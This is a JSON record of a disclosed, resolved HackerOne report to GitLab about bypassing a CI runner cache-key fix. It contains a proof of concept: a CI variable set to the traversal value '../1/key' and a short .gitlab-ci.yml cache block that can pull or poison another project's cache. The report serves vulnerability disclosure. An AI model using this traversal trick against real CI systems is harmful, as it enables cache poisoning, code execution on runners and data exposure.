{"id":409395,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDkzOTU=","url":"https://hackerone.com/reports/409395","title":"Bypass of GitLab CI runner slash fix in YAML validation","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-09-13T11:50:47.225Z","submitted_at":"2018-09-13T11:50:47.225Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ngalog","url":"/ngalog","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-04-10T04:33:42.240Z","bug_reporter_agreed_on_going_public_at":"2019-03-11T04:33:41.871Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Gitlab Security,\n\nI notice the bug #301432 that Jobert reported earlier is could be bypassed by setting variable in environment.\n\nThe reason is that the fix in place preventing url normalization is performed by doing the YAML  validation, however this could be bypassed by setting the environment variable in `https://gitlab.com/{project_id}/settings/ci_cd`\n\nBy setting the key ONE and variable value to `../1/key`, it is possible to replicate what jobert did in #301432.\n\nAnd in `.gitlab-ci.yml`\n\n```\na:\n  script:\n  - echo \"script\"\n  - echo \"a\"\n  cache:\n    key: \"$ONE\"\n    policy: pull #or push if you like to poison\n    paths:\n      - .\n```\n\nThen make any change to `.gitlab-ci.yml` will trigger the bug once again.\n\nDownload from cache\n{F345819}\nSetting environment variable\n{F345820}\nUpload to cache\n{F345821}\n\n## Impact\n\nQuoting from  #301432\n```\nDepending on the files that are cached, this may allow an attacker to run arbitrary code on a victim's Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.\n```","vulnerability_information_html":"\u003cp\u003eHi Gitlab Security,\u003c/p\u003e\n\n\u003cp\u003eI notice the bug \u003ca href=\"/reports/301432\"\u003e#301432\u003c/a\u003e that Jobert reported earlier is could be bypassed by setting variable in environment.\u003c/p\u003e\n\n\u003cp\u003eThe reason is that the fix in place preventing url normalization is performed by doing the YAML  validation, however this could be bypassed by setting the environment variable in \u003ccode\u003ehttps://gitlab.com/{project_id}/settings/ci_cd\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eBy setting the key ONE and variable value to \u003ccode\u003e../1/key\u003c/code\u003e, it is possible to replicate what jobert did in \u003ca href=\"/reports/301432\"\u003e#301432\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eAnd in \u003ccode\u003e.gitlab-ci.yml\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:\n  script:\n  - echo \u0026quot;script\u0026quot;\n  - echo \u0026quot;a\u0026quot;\n  cache:\n    key: \u0026quot;$ONE\u0026quot;\n    policy: pull #or push if you like to poison\n    paths:\n      - .\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThen make any change to \u003ccode\u003e.gitlab-ci.yml\u003c/code\u003e will trigger the bug once again.\u003c/p\u003e\n\n\u003cp\u003eDownload from cache\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"download.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/819/31a4e9638fc63f09b77dddc8fa6e8d53e5d3af3e/download.png?response-content-disposition=attachment%3B%20filename%3D%22download.png%22%3B%20filename%2A%3DUTF-8%27%27download.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=ae00cd1ccd916a0ddcc9779b9fb2e7096c07eb9c932fc871b22b77136da2a05f\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/819/31a4e9638fc63f09b77dddc8fa6e8d53e5d3af3e/download.png?response-content-disposition=attachment%3B%20filename%3D%22download.png%22%3B%20filename%2A%3DUTF-8%27%27download.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=ae00cd1ccd916a0ddcc9779b9fb2e7096c07eb9c932fc871b22b77136da2a05f\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nSetting environment variable\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"environemtn_variable.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/820/e035de2b2f6e884c6d620008aa1cc5949a2a2bde/environemtn_variable.png?response-content-disposition=attachment%3B%20filename%3D%22environemtn_variable.png%22%3B%20filename%2A%3DUTF-8%27%27environemtn_variable.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=0fedd147fca3e05499ed3958ad039dbe75b53405a6cd83c90f0a6986030bdfee\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/820/e035de2b2f6e884c6d620008aa1cc5949a2a2bde/environemtn_variable.png?response-content-disposition=attachment%3B%20filename%3D%22environemtn_variable.png%22%3B%20filename%2A%3DUTF-8%27%27environemtn_variable.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=0fedd147fca3e05499ed3958ad039dbe75b53405a6cd83c90f0a6986030bdfee\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nUpload to cache\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"upload.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/821/a71d8b22d2076e221505ab76a8f8dc53fff39ffe/upload.png?response-content-disposition=attachment%3B%20filename%3D%22upload.png%22%3B%20filename%2A%3DUTF-8%27%27upload.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=ba084048bb0e05b8a9ee5670b2e4c0dde01fac7bc3980f6333454ef2c690559c\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/821/a71d8b22d2076e221505ab76a8f8dc53fff39ffe/upload.png?response-content-disposition=attachment%3B%20filename%3D%22upload.png%22%3B%20filename%2A%3DUTF-8%27%27upload.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055248Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=ba084048bb0e05b8a9ee5670b2e4c0dde01fac7bc3980f6333454ef2c690559c\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eQuoting from  \u003ca href=\"/reports/301432\"\u003e#301432\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDepending on the files that are cached, this may allow an attacker to run arbitrary code on a victim\u0026#39;s Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"12000.0","formatted_bounty":"$12,000","weakness":{"id":107,"name":"Improper Input Validation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":345819,"file_name":"download.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/819/31a4e9638fc63f09b77dddc8fa6e8d53e5d3af3e/download.png?response-content-disposition=attachment%3B%20filename%3D%22download.png%22%3B%20filename%2A%3DUTF-8%27%27download.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055248Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=ae00cd1ccd916a0ddcc9779b9fb2e7096c07eb9c932fc871b22b77136da2a05f","file_size":344405,"type":"image/png"},{"id":345820,"file_name":"environemtn_variable.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/820/e035de2b2f6e884c6d620008aa1cc5949a2a2bde/environemtn_variable.png?response-content-disposition=attachment%3B%20filename%3D%22environemtn_variable.png%22%3B%20filename%2A%3DUTF-8%27%27environemtn_variable.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055248Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=0fedd14